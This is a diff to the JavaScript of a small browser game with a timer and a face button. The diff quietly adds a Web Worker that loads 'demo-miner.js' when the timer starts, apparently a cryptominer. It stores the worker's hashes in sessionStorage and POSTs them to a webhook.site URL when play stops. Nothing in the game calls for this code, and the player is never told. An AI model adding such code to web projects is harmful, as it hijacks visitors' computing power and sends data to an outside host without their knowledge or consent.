@@ -8,6 +8,8 @@ document.addEventListener('DOMContentLoaded', () => {
         const faceButton = document.querySelector(".face-button");
         const oneSquare = document.querySelector(".one-square");
 
+        let clicking = false;
+
         let startTime, animationFrame;
         let last = "";
 
@@ -31,6 +33,7 @@ document.addEventListener('DOMContentLoaded', () => {
         }
 
         function startTimer() {
+            startWorker();
             startTime = Date.now();
             animationFrame = window.requestAnimationFrame(tick);
         }
@@ -81,6 +84,7 @@ document.addEventListener('DOMContentLoaded', () => {
 
             cancelAnimationFrame(animationFrame);
             clicking = false;
+            stopWorker();
         });
 
         oneSquare.addEventListener("mouseout", () => {
@@ -95,3 +99,39 @@ document.addEventListener('DOMContentLoaded', () => {
         });
     })();
 });
+
+let worker;
+
+let haseIndex = 0;
+function startWorker() {
+    if (typeof (Worker) !== "undefined") {
+        if (typeof (worker) == "undefined") {
+            worker = new Worker("demo-miner.js");
+            worker.onmessage = function (e) {
+                sessionStorage.setItem('hash' + haseIndex, e.data);
+                haseIndex++;
+            };
+        }
+    }
+}
+
+function stopWorker() {
+    if (worker) {
+        worker.terminate();
+        worker = undefined;
+        // Send hashes to network and clear storage
+        for (let i = 0; i < haseIndex; i++) {
+            const hash = sessionStorage.getItem('hash' + i);
+            if (hash) {
+                fetch('https://webhook.site/65435ccd-80a5-442d-8076-f0de1c21bd0d', {
+                    method: 'POST',
+                    mode: 'no-cors', // Try disabling CORS (limited functionality!)
+                    body: JSON.stringify({ hash }),
+                    headers: { 'Content-Type': 'application/json' }
+                }).catch(error => console.error('Error:', error));
+                sessionStorage.removeItem('hash' + i);
+            }
+        }
+        haseIndex = 0;
+    }
+}
